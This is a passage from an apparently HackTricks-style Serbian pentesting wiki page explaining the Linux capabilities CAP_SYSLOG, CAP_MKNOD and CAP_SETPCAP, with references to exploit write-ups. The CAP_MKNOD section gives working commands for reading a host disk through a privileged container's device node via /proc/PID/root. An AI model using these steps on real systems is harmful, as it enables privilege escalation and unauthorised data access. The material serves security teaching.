[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) izdvojen je iz šireg **CAP_SYS_ADMIN** u Linux-u 2.6.37, čime je posebno omogućeno korišćenje `syslog(2)` call-a. Ova capability omogućava pregled kernel adresa preko `/proc` i sličnih interfejsa kada je `kptr_restrict` podešen na 1, što kontroliše izlaganje kernel adresa. Od Linux-a 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, iako mnoge distribucije ovo podešavaju na 1 (sakrij adrese osim od uid 0) ili 2 (uvek sakrij adrese) iz bezbednosnih razloga.

Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` output-u kada je `dmesg_restrict` podešen na 1. Uprkos ovim promenama, **CAP_SYS_ADMIN** zadržava mogućnost obavljanja `syslog` operacija zbog istorijskih razloga.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost `mknod` system call-a izvan kreiranja regularnih fajlova, FIFO-ova (named pipe-ova) ili UNIX domain socket-a. Konkretno, omogućava kreiranje special fajlova, koji uključuju:

- **S_IFCHR**: Character special fajlovi, odnosno device-i poput terminala.
- **S_IFBLK**: Block special fajlovi, odnosno device-i poput diskova.

Ova capability je neophodna za procese kojima je potrebna mogućnost kreiranja device fajlova, čime se omogućava direktna interakcija sa hardware-om preko character ili block device-a.

To je podrazumevana docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ova capability omogućava privilege escalation (putem čitanja celog diska) na host-u, pod sledećim uslovima:<sup>[[7]](#references)</sup>

1. Imati početni pristup host-u (Unprivileged).
2. Imati početni pristup container-u (Privileged (EUID 0) i efektivni `CAP_MKNOD`).
3. Host i container treba da dele isti user namespace.

**Koraci za kreiranje i pristup Block Device-u u Container-u:**

1. **Na Host-u kao Standard User:**

- Odredite svoj trenutni user ID pomoću `id`, npr. `uid=1000(standarduser)`.
- Identifikujte ciljni device, na primer `/dev/sdb`.

2. **Unutar Container-a kao `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Nazad na Hostu:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Ovaj pristup omogućava standardnom korisniku da pristupi podacima na uređaju `/dev/sdb` kroz container i potencijalno ih pročita, iskorišćavajući deljene user namespaces i permissions postavljene na uređaju.

### CAP_SETPCAP

**CAP_SETPCAP** omogućava procesu da **menja capability sets** drugog procesa, čime se omogućava dodavanje ili uklanjanje capabilities iz effective, inheritable i permitted sets. Međutim, proces može da menja samo capabilities koje poseduje u sopstvenom permitted setu, čime se sprečava da privileges drugog procesa podigne iznad sopstvenog nivoa. Novija ažuriranja kernela pooštrila su ova pravila, ograničavajući `CAP_SETPCAP` na smanjivanje capabilities unutar sopstvenog permitted seta ili permitted setova svojih potomaka, sa ciljem ublažavanja security rizika. Za korišćenje je potrebno imati `CAP_SETPCAP` u effective setu i ciljne capabilities u permitted setu, uz korišćenje `capset()` za izmene. Ovo sažima osnovnu funkciju i ograničenja `CAP_SETPCAP`, naglašavajući njegovu ulogu u upravljanju privileges i unapređenju security-ja.

**`CAP_SETPCAP`** je Linux capability koja procesu omogućava da **menja capability sets drugog procesa**. Omogućava dodavanje ili uklanjanje capabilities iz effective, inheritable i permitted capability sets drugih procesa. Međutim, postoje određena ograničenja u načinu korišćenja ove capability.

Proces sa `CAP_SETPCAP` **može da dodeli ili ukloni samo capabilities koje se nalaze u njegovom sopstvenom permitted capability setu**. Drugim rečima, proces ne može da dodeli capability drugom procesu ako je sam ne poseduje. Ovo ograničenje sprečava proces da privileges drugog procesa podigne iznad sopstvenog nivoa privileges.

Pored toga, u novijim verzijama kernela capability `CAP_SETPCAP` je **dodatno ograničena**. Ona više ne omogućava procesu da proizvoljno menja capability sets drugih procesa. Umesto toga, **omogućava procesu samo da smanji capabilities u sopstvenom permitted capability setu ili permitted capability setu svojih potomaka**. Ova izmena je uvedena radi smanjenja potencijalnih security rizika povezanih sa ovom capability.

Za efikasno korišćenje `CAP_SETPCAP`, potrebno je da capability bude prisutna u vašem effective capability setu, a ciljne capabilities u vašem permitted capability setu. Zatim možete koristiti system call `capset()` za izmenu capability sets drugih procesa.

Ukratko, `CAP_SETPCAP` procesu omogućava da menja capability sets drugih procesa, ali ne može da dodeli capabilities koje sam ne poseduje. Pored toga, zbog security problema, njena funkcionalnost je u novijim verzijama kernela ograničena tako da omogućava samo smanjivanje capabilities u sopstvenom permitted capability setu ili permitted capability setovima svojih potomaka.

## Reference

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [WithSecure Labs: Abusing the access to mount namespaces through /proc/pid/root](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)

{{#include ../../banners/hacktricks-training.md}}
